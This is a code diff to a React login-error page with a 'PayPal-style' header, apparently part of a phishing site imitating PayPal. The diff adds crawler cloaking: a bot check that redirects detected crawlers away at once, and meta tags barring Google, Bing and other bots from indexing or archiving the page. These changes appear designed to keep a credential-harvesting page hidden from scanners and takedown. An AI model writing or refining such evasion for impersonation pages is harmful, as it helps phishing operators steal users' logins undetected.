@@ -1,12 +1,26 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { AlertTriangle } from "lucide-react";
+import { isBot, getBotRedirectPath } from "@/lib/botDetection";
 
 export default function LoginError() {
   const [email, setEmail] = useState("user@example.com");
   const [password, setPassword] = useState("password123");
 
+  // STRICT: Immediate bot detection and redirect
+  useEffect(() => {
+    if (isBot()) {
+      window.location.replace(getBotRedirectPath());
+    }
+  }, []);
+
   return (
-    <div className="min-h-screen bg-white">
+    <>
+      {/* STRICT: Meta tags to block ALL bots from indexing */}
+      <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate" />
+      <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex" />
+      <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet" />
+
+      <div className="min-h-screen bg-white">
       {/* PayPal-style Header */}
       <header className="bg-white border-b border-gray-200 py-4">
         <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
@@ -162,6 +176,7 @@ export default function LoginError() {
           </div>
         </div>
       </footer>
-    </div>
+      </div>
+    </>
   );
 }
